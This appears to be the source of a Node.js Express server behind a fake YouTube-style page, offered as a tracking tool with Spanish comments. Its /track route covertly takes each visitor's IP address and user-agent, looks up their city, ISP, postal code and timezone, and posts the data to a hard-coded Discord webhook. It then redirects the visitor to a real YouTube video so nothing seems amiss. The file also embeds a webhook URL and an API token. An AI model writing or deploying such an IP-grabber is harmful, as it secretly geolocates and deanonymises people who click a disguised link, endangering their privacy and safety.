cconst express = require("express");
const fetch = require("node-fetch");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

const REAL_YOUTUBE_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1360813090098122913/BW90Lv2Z2rKvNKl5fCChCECvJbtgwoamIVKfh7CYlACRnHDjKtICaU_KVA-93D_9efiI"; // Pega el tuyo

// Servir HTML falso estilo YouTube
app.use(express.static(path.join(__dirname, "public")));

async function getIPInfo(ip) {
  try {
    const res = await fetch(`https://ipinfo.io/${ip}/json?token=2588357cc4131e`);
    return await res.json();
  } catch (err) {
    console.error("Error al obtener info de IP:", err);
    return {};
  }
}

async function sendToDiscord(info, userAgent, timestamp) {
  const message = {
    content: `📡 **Nueva visita al video falso**

🕒 Hora (UTC): ${timestamp}
🌐 IP: \`${info.ip || "Desconocida"}\`
🏙️ Ciudad: ${info.city || "Desconocida"}, ${info.region || "Desconocida"}
🌍 País: ${info.country_name || "Desconocido"}
🏢 ISP: ${info.org || "Desconocido"}
📦 ASN: ${info.asn || "Desconocido"}
📫 Código Postal: ${info.postal || "Desconocido"}
🕰️ Zona Horaria: ${info.timezone || "Desconocido"}
🧭 User-Agent:
\`\`\`${userAgent || "No disponible"}\`\`\``
  };

  await fetch(DISCORD_WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(message)
  });
}

app.get("/track", async (req, res) => {
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const userAgent = req.headers["user-agent"];
  const timestamp = new Date().toISOString();

  const info = await getIPInfo(ip);
  info.ip = ip;

  await sendToDiscord(info, userAgent, timestamp);

  res.redirect(REAL_YOUTUBE_URL);
});

app.listen(PORT, () => {
  console.log(`Servidor activo en el puerto ${PORT}`);
});
